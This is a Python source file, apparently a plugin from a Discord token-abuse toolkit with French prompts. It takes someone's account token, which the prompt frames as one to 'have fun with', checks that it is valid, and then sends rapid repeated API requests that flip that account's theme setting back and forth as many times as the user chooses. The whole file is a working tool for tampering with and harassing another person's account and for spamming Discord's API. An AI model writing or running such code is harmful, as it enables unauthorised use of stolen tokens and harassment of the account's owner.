from assets.plugin.common.base import *


def cyclecolortheme():
    rpc("Color Spammer")
    clear()
    Clspam_banner()
    token = input(f"{y}[{b}#{y}]{w}Entre le token avec lequel tu veux t'amuser:\n>>> ")
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    r = get('https://discord.com/api/v8/users/@me', headers=headers)
    
    if r.status_code == 200:
        clear()
        Clspam_banner()
        amount = input(f"{y}[{b}#{y}]{w}Entre le nombre de changement de couleur:\n>>> ")
        modes = cycle(["light", "dark"])
        
        clear()
        Clspam_banner()
        for i in range(int(amount)):
            time_print(f"{w}Couleur changées #{i}")
            sleep(0.0001)
            setting = {'theme': next(modes)}
            patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
        clear()
        Clspam_banner()
        input(f"{y}[{b}#{y}]{w}Le cycle est terminé !\nAppuyez sur entrée pour quitter...")
      
    else:
        clear()
        input(f"""{y}[{b}-{y}]{w}Token Invalide\nAppuyez sur entrée pour quitter...""")
        